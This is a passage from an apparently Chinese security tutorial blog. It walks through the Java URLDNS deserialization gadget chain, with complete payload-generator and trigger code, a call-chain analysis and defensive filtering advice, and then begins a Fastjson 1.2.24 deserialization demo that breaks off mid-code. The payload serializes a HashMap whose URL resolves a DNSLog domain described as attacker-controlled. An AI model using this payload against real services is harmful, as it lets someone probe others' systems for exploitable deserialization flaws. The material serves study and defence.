+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">      <span class="type">int</span> h;</span><br><span class="line">      <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>传入的是一个对象，如果传入的对象时URL（别人发现构造好的，知识分析），调用<code>key.hashCode</code>,查看hashCode，</p>
+<p><img src="/./images/image-20250904152145593.png" alt="image-20250904152145593"></p>
+<p>进去后查看他的实现</p>
+<p><img src="/./images/image-20250904152233921.png" alt="image-20250904152233921"></p>
+<p>点击进去，发现</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果hashCode &#x3D; -1，执行<code>hashCode = handler.hashCode(this);</code>，查看handler，</p>
+<p>定位到<code>transient URLStreamHandler handler;</code>,继续定位<code>URLStreamHandler</code>,</p>
+<p><img src="/./images/image-20250904152638836.png" alt="image-20250904152638836"></p>
+<p>在他的hashCode中有</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InetAddress addr = getHostAddress(u);</span><br></pre></td></tr></table></figure></blockquote>
+<blockquote>
+<h3 id="整体流程概览"><a href="#整体流程概览" class="headerlink" title="整体流程概览"></a>整体流程概览</h3><ol>
+<li><strong>起点</strong>：<code>HashMap</code> 的 <code>readObject</code> 方法。</li>
+<li><strong>关键调用</strong>：<code>readObject</code> -&gt; <code>putVal</code> -&gt; <code>hash(key)</code> -&gt; <code>key.hashCode()</code>。</li>
+<li><strong>核心利用</strong>：如果这个 <code>key</code> 是一个 <code>java.net.URL</code> 对象，其 <code>hashCode</code> 方法在第一次计算时（<code>hashCode != -1</code>）会调用 <code>getHostAddress(host)</code> 方法进行 DNS 解析。</li>
+<li><strong>避免“污染”</strong>：为了在 <code>put</code> 操作时不立即触发 DNS，需要预先将 URL 对象的 <code>hashCode</code> 字段设置为一个非 -1 的值（通常通过反射修改）。</li>
+</ol>
+</blockquote>
+<h2 id="构造链"><a href="#构造链" class="headerlink" title="构造链"></a>构造链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ConstractChain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UrlDnsChain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialization</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;dns.txt&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        HashMap&lt;Object, Integer&gt; objectObjectHashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://ddbxplkdlx.yutu.eu.org&quot;</span>);</span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">URL</span>&gt; aClass = url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.set(url, <span class="number">11234</span>);</span><br><span class="line">        objectObjectHashMap.put(url,<span class="number">1</span>);</span><br><span class="line">        hashCode.set(url, -<span class="number">1</span>);</span><br><span class="line">        Serialization(objectObjectHashMap);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ConstractChain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnSerializableDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">UnSerializableDemo</span><span class="params">(String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(name));</span><br><span class="line">        Object o=objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> UnSerializableDemo(<span class="string">&quot;dns.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="整体架构分析"><a href="#整体架构分析" class="headerlink" title="整体架构分析"></a>整体架构分析</h2><blockquote>
+<p>第一段代码：<code>UrlDnsChain</code> - <strong>攻击载荷生成器</strong></p>
+<p>第二段代码：<code>UnSerializableDemo</code> - <strong>漏洞触发模拟器</strong></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">flowchart TD</span><br><span class="line">    A[UrlDnsChain.main] --&gt; B[创建HashMap和URL对象]</span><br><span class="line">    B --&gt; C[反射修改URL.hashCode为11234]</span><br><span class="line">    C --&gt; D[HashMap.putURL,1不触发DNS]</span><br><span class="line">    D --&gt; E[反射恢复URL.hashCode为-1]</span><br><span class="line">    E --&gt; F[序列化HashMap到dns.txt]</span><br><span class="line">    F --&gt; G[UnSerializableDemo.main]</span><br><span class="line">    G --&gt; H[读取dns.txt文件]</span><br><span class="line">    H --&gt; I[ObjectInputStream.readObject]</span><br><span class="line">    I --&gt; J[触发HashMap.readObject]</span><br><span class="line">    J --&gt; K[触发URL.hashCode计算]</span><br><span class="line">    K --&gt; L[发起DNS查询]</span><br><span class="line">    L --&gt; M[DNSLog平台收到记录]</span><br></pre></td></tr></table></figure>
+
+<h2 id="详细技术原理分析"><a href="#详细技术原理分析" class="headerlink" title="详细技术原理分析"></a>详细技术原理分析</h2><h3 id="1-载荷生成阶段-UrlDnsChain"><a href="#1-载荷生成阶段-UrlDnsChain" class="headerlink" title="1. 载荷生成阶段 (UrlDnsChain)"></a>1. 载荷生成阶段 (<code>UrlDnsChain</code>)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Object, Integer&gt; objectObjectHashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://ddbxplkdlx.yutu.eu.org&quot;</span>);</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>创建容器</strong>: HashMap作为反序列化的入口点</li>
+<li><strong>恶意URL</strong>: 指向攻击者控制的DNSLog域名</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">hashCode.set(url, <span class="number">11234</span>);  <span class="comment">// 关键操作1: 防止立即触发</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>反射技巧</strong>: 修改URL内部状态</li>
+<li><strong>设置hashCode&#x3D;11234</strong>: 避免put时触发DNS</li>
+<li><strong>为什么是11234?</strong>: 任意非-1的值都可以</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectObjectHashMap.put(url, <span class="number">1</span>);  <span class="comment">// 安全操作</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>此时安全</strong>: 因为hashCode≠-1，直接返回值，不计算新hash</li>
+<li><strong>URL.hashCode()逻辑</strong>:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (hashCode != -<span class="number">1</span>) <span class="keyword">return</span> hashCode;  <span class="comment">// 直接返回11234</span></span><br><span class="line"><span class="comment">// 不会执行到handler.hashCode(this)的DNS触发部分</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashCode.set(url, -<span class="number">1</span>);  <span class="comment">// 关键操作2: 为触发做准备</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>恢复为-1</strong>: 确保反序列化时重新计算hashCode</li>
+<li><strong>序列化时状态</strong>: URL对象的hashCode字段值为-1</li>
+</ul>
+<h3 id="2-漏洞触发阶段-UnSerializableDemo"><a href="#2-漏洞触发阶段-UnSerializableDemo" class="headerlink" title="2. 漏洞触发阶段 (UnSerializableDemo)"></a>2. 漏洞触发阶段 (<code>UnSerializableDemo</code>)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(name));</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> objectInputStream.readObject();  <span class="comment">// 触发点</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="反序列化详细调用链："><a href="#反序列化详细调用链：" class="headerlink" title="反序列化详细调用链："></a>反序列化详细调用链：</h4><ol>
+<li><p><strong>HashMap.readObject()</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 读取容量、加载因子等</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();    <span class="comment">// 反序列化URL对象</span></span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();  <span class="comment">// 反序列化Integer对象</span></span><br><span class="line">        putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);  <span class="comment">// 关键调用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>HashMap.hash(key)</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>URL.hashCode()</strong> - <strong>核心触发点</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)  <span class="comment">// 此时hashCode=-1，条件不成立</span></span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);  <span class="comment">// 执行这里！</span></span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>URLStreamHandler.hashCode(URL u)</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 生成主机部分hash</span></span><br><span class="line">    <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);  <span class="comment">// DNS触发！</span></span><br><span class="line">    <span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">        h += addr.hashCode();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        h += u.getHost().hashCode();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>URLStreamHandler.getHostAddress(URL u)</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">    <span class="keyword">if</span> (host == <span class="literal">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> InetAddress.getByName(host);  <span class="comment">// 实际DNS查询</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="技术要点深度解析"><a href="#技术要点深度解析" class="headerlink" title="技术要点深度解析"></a>技术要点深度解析</h2><h3 id="为什么这个链有效？"><a href="#为什么这个链有效？" class="headerlink" title="为什么这个链有效？"></a>为什么这个链有效？</h3><ol>
+<li><p><strong>利用Java序列化机制</strong></p>
+<ul>
+<li>HashMap实现了Serializable接口</li>
+<li>URL也实现了Serializable接口</li>
+<li>整个对象图都可以被序列化&#x2F;反序列化</li>
+</ul>
+</li>
+<li><p><strong>利用HashMap反序列化行为</strong></p>
+<ul>
+<li>HashMap反序列化时会重新计算每个元素的hash值</li>
+<li>这是为了确保数据结构的完整性</li>
+</ul>
+</li>
+<li><p><strong>利用URL的hashCode延迟计算</strong></p>
+<ul>
+<li>URL的hashCode在第一次访问时计算</li>
+<li>计算过程包含DNS解析操作</li>
+</ul>
+</li>
+</ol>
+<h3 id="反射操作的精妙之处"><a href="#反射操作的精妙之处" class="headerlink" title="反射操作的精妙之处"></a>反射操作的精妙之处</h3><p><strong>问题</strong>: 如果直接put URL：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://malicious.com&quot;</span>);</span><br><span class="line">map.put(url, <span class="number">1</span>);  <span class="comment">// 立即触发DNS，暴露攻击！</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>解决方案</strong>: 反射修改内部状态</p>
+<ol>
+<li><strong>临时禁用</strong>: <code>hashCode.set(url, 非-1值)</code> → put时不触发</li>
+<li><strong>恢复启用</strong>: <code>hashCode.set(url, -1)</code> → 反序列化时触发</li>
+</ol>
+<h3 id="攻击特征："><a href="#攻击特征：" class="headerlink" title="攻击特征："></a>攻击特征：</h3><ul>
+<li><strong>低权限要求</strong>: 只需要反序列化操作权限</li>
+<li><strong>网络流量</strong>: 产生DNS查询记录</li>
+<li><strong>系统影响</strong>: 几乎为零（只发起DNS查询）</li>
+</ul>
+<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><h3 id="代码层面："><a href="#代码层面：" class="headerlink" title="代码层面："></a>代码层面：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用ObjectInputFilter（JDK9+）</span></span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(input);</span><br><span class="line">ois.setObjectInputFilter(filter);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者使用白名单机制</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SafeObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Set&lt;String&gt; whitelist = Set.of(</span><br><span class="line">        <span class="string">&quot;java.lang.String&quot;</span>, <span class="string">&quot;java.lang.Integer&quot;</span>, <span class="string">&quot;java.util.ArrayList&quot;</span></span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!whitelist.contains(desc.getName())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized deserialization&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="架构层面："><a href="#架构层面：" class="headerlink" title="架构层面："></a>架构层面：</h3><ol>
+<li><strong>输入验证</strong>: 对所有反序列化数据源进行校验</li>
+<li><strong>网络隔离</strong>: 限制不必要的出网连接</li>
+<li><strong>日志监控</strong>: 监控异常的反序列化操作</li>
+<li><strong>依赖管理</strong>: 避免使用已知存在漏洞的库</li>
+</ol>
+<h1 id="Fastjson反序列化"><a href="#Fastjson反序列化" class="headerlink" title="Fastjson反序列化"></a>Fastjson反序列化</h1><h2 id="FastJson介绍"><a href="#FastJson介绍" class="headerlink" title="FastJson介绍"></a>FastJson介绍</h2><p>FastJSON 是阿里巴巴开发的一款高性能、功能完善的 Java 语言 JSON 处理库，主要用于实现 Java 对象与 JSON 格式之间的相互转换（序列化与反序列化）。它以速度快、使用简单、功能丰富等特点被广泛应用于 Java 开发中，尤其在分布式系统、微服务架构中处理数据交换场景非常常见。</p>
+<p>主要功能：<strong>对象与 JSON 互转</strong></p>
+<ul>
+<li>序列化：将 Java 对象（包括普通类、集合、数组等）转换为 JSON 字符串。</li>
+<li>反序列化：将 JSON 字符串转换为指定的 Java 对象或数据结构。</li>
+</ul>
+<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><h3 id="pom-xml中添加"><a href="#pom-xml中添加" class="headerlink" title="pom.xml中添加"></a>pom.xml中添加</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="创建User-java"><a href="#创建User-java" class="headerlink" title="创建User.java"></a>创建User.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonUnserializationDemo.One;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> sex;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, <span class="type">int</span> age, <span class="type">int</span> sex)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用有参构造&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSex</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getSex&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(<span class="type">int</span> sex)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setSex&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">chat</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span 